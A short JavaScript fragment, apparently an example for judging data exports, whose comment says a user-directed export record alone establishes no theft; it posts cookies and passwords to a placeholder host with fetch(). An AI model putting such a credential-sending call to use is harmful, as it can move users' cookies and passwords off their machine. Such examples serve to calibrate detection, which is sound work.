// A user-directed export record alone establishes no theft.
fetch('https://backup.example.invalid/import', {
  method: 'POST',
  body: JSON.stringify({ data: { cookies: chosenCookies, passwords: chosenPasswords } })
});
